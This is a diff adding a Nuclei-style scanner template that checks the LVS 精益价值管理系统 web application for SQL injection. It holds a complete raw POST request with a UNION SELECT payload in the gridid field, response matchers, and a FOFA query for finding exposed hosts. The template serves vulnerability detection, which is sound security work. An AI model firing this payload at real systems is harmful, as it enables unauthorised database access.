@@ -1,0 +1,38 @@
+id: lvs-ajax-sqli
+
+info:
+  name: LVS ajax - SQL Injection
+  author: qwtd
+  severity: high
+  reference:
+    - https://wiki.wy876.cn/#/./LVS%E7%B2%BE%E7%9B%8A%E4%BB%B7%E5%80%BC%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F/LVS%E7%B2%BE%E7%9B%8A%E4%BB%B7%E5%80%BC%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9FLVS.Web.ashx%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E
+  metadata:
+    verified: true
+    max-request: 1
+    fofa-query: body="/ajax/LVS.Core.Common.STSResult,LVS.Core.Common.ashx"
+  tags: LVS精益价值管理系统
+
+http:
+  - raw:
+      - |
+        POST /ajax/LVS.Web.AgencytaskList,LVS.Web.ashx?_method=GetColumnIndex&_session=r HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36
+        Content-Type: text/plain; charset=UTF-8
+        Accept-Encoding: gzip, deflate
+        Accept: */*
+        Connection: keep-alive
+
+        src=AgencytaskList
+        gridid=1' UNION ALL SELECT @@VERSION--
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "Microsoft SQL Server"
+
+      - type: status
+        status:
+          - 200
